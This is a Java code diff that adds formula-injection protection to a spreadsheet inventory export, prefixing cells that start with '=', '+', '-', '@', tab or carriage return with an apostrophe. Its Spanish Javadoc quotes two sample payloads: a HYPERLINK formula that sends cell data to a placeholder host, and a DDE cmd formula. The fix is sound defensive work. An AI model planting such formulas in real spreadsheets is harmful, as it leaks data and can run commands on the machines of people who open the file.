@@ -74,7 +74,7 @@ public class InventoryExportService {
             Workbook workbook = new Workbook(output, "Kardo", "1.0");
             Worksheet sheet = workbook.newWorksheet("Inventario valorizado");
 
-            sheet.value(0, 0, "Inventario valorizado · " + storeName);
+            sheet.value(0, 0, safe("Inventario valorizado · " + storeName));
             sheet.value(1, 0, "Generado el " + LocalDate.now());
             sheet.range(0, 0, 0, HEADERS.length - 1).style().bold().set();
 
@@ -97,11 +97,13 @@ public class InventoryExportService {
                 BigDecimal unitCost = rs.getBigDecimal("unit_cost");
                 BigDecimal value = rs.getBigDecimal("valor");
 
-                sheet.value(current, 0, rs.getString("sku"));
-                sheet.value(current, 1, rs.getString("name"));
-                sheet.value(current, 2, rs.getString("category"));
-                sheet.value(current, 3, rs.getString("unit_of_measure"));
-                sheet.value(current, 4, rs.getString("batch_code"));
+                // Las cinco columnas de texto salen del catalogo, que se llena
+                // desde el Excel del cliente: van neutralizadas.
+                sheet.value(current, 0, safe(rs.getString("sku")));
+                sheet.value(current, 1, safe(rs.getString("name")));
+                sheet.value(current, 2, safe(rs.getString("category")));
+                sheet.value(current, 3, safe(rs.getString("unit_of_measure")));
+                sheet.value(current, 4, safe(rs.getString("batch_code")));
                 sheet.value(current, 5, text(rs.getObject("manufacturing_date", LocalDate.class)));
                 sheet.value(current, 6, text(rs.getObject("expiration_date", LocalDate.class)));
                 sheet.value(current, 7, rs.getInt("dias_restantes"));
@@ -134,6 +136,35 @@ public class InventoryExportService {
 
     private static String text(LocalDate date) {
         return date == null ? "" : date.toString();
+    }
+
+    /**
+     * Neutraliza una celda de texto para que Excel no la lea como formula.
+     *
+     * <p><b>El ataque.</b> Kardo escribe en la hoja nombres de producto que
+     * vinieron del Excel del propio cliente. Una celda que empieza por
+     * {@code =}, {@code +}, {@code -} o {@code @} no es texto para Excel, es una
+     * formula, y {@code =HYPERLINK("http://x/?"&A2,"Ver")} o un
+     * {@code =cmd|...!A1} con DDE convierten la exportacion en un archivo que
+     * filtra el inventario -o pide ejecutar algo- en cuanto el contador lo abre
+     * y acepta el aviso. El atacante no necesita entrar a Kardo: le basta con
+     * que su nombre de producto llegue al catalogo.
+     *
+     * <p><b>El arreglo.</b> Un apostrofo delante. Es el marcador de "esto es
+     * texto" de Excel: no se ve en la celda, no viaja al copiar el valor, y
+     * desactiva la evaluacion. Se prefiere a borrar el caracter porque un
+     * producto que de verdad se llama "-40 grados" tiene que seguir leyendose
+     * igual. Tambien entran el tabulador y el retorno de carro, que algunas
+     * hojas de calculo recortan antes de decidir si la celda es formula.
+     */
+    static String safe(String cell) {
+        if (cell == null || cell.isEmpty()) {
+            return cell;
+        }
+        return switch (cell.charAt(0)) {
+            case '=', '+', '-', '@', '\t', '\r' -> "'" + cell;
+            default -> cell;
+        };
     }
 
     /** Acumuladores de la fila de totales. */
